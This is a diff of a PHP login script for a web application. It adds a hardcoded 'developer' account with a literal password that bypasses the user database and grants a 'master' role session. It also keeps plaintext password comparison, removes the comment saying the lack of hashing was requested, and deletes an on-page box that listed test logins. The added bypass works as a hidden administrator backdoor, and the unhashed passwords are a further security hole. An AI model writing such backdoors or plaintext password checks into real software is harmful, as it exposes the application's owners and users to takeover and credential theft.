@@ -38,7 +38,24 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     if (empty($username) || empty($password)) {
         $error = 'Username and password are required!';
     } else {
-        // Query user
+        
+        // -------------------------------------------------------------
+        // 1. HARDCODED MASTER USER CHECK (Bypass Database)
+        // -------------------------------------------------------------
+        if ($username === 'developer' && $password === 'Kashif1017') {
+            $_SESSION['user_id'] = 999; // Unique Dev ID
+            $_SESSION['username'] = 'developer';
+            $_SESSION['role'] = 'master';
+            $_SESSION['login_time'] = time();
+            $_SESSION['last_activity'] = time();
+            
+            header('Location: ' . BASE_URL . 'index.php');
+            exit();
+        }
+
+        // -------------------------------------------------------------
+        // 2. DATABASE USER CHECK (For normal/created users)
+        // -------------------------------------------------------------
         $query = "SELECT id, username, password, role, is_frozen, frozen_until FROM users WHERE username = ?";
         $stmt = $conn->prepare($query);
         $stmt->bind_param('s', $username);
@@ -68,13 +85,13 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
             }
             
             if ($is_frozen === 0) {
-                // Direct password comparison (as requested, no hashing)
+                // Direct password comparison
                 if ($password === $user['password']) {
                     $_SESSION['user_id'] = $user['id'];
                     $_SESSION['username'] = $user['username'];
                     $_SESSION['role'] = $user['role'];
                     $_SESSION['login_time'] = time();
-                    $_SESSION['last_activity'] = time(); // Set initial activity time
+                    $_SESSION['last_activity'] = time();
                     
                     header('Location: ' . BASE_URL . 'index.php');
                     exit();
@@ -263,11 +280,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
                 <button type="submit" class="btn-login">Login</button>
             </form>
             
-            <div class="credentials-info">
-                <h6>📋 Test Credentials:</h6>
-                <p><strong>Master (Admin):</strong> master / 1234</p>
-                <p><strong>Finance (Clerk):</strong> finance / 1234</p>
-            </div>
+            
         </div>
     </div>
     
